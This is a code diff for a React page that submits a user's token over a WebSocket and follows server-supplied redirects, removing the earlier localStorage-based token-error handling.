@@ -21,19 +21,9 @@ const FeixePage = () => {
   const { send } = useWebSocket({
     reconectarPayload: { dispositivo },
     onRedirect: (msg) => {
-      const route = resolveServerRoute(msg.url);
-      if (route === "/erro-token") {
-        setEnviandoChave(false);
-        const erroSalvo = localStorage.getItem("erroToken");
-        if (erroSalvo) {
-          setErroChave(erroSalvo);
-          localStorage.removeItem("erroToken");
-        }
-        return;
-      }
       setStatus("validando");
       setTimeout(() => {
-        navigate(route);
+        navigate(resolveServerRoute(msg.url));
       }, 1500);
     },
     onMessage: (msg) => {
@@ -51,15 +41,6 @@ const FeixePage = () => {
       }
     },
   });
-
-  useEffect(() => {
-    const erroSalvo = localStorage.getItem("erroToken");
-    if (erroSalvo) {
-      setErroChave(erroSalvo);
-      setEnviandoChave(false);
-      localStorage.removeItem("erroToken");
-    }
-  }, []);
 
   const iniciarLeitura = useCallback(() => {
     if (!binario) return;
@@ -106,7 +87,6 @@ const FeixePage = () => {
     setErroChave("");
     setEnviandoChave(true);
     send({ acao: "token", usuario, token: chave.join("") });
-    localStorage.setItem("paginaOrigem", "/feixe");
     navigate("/validando");
   };
 
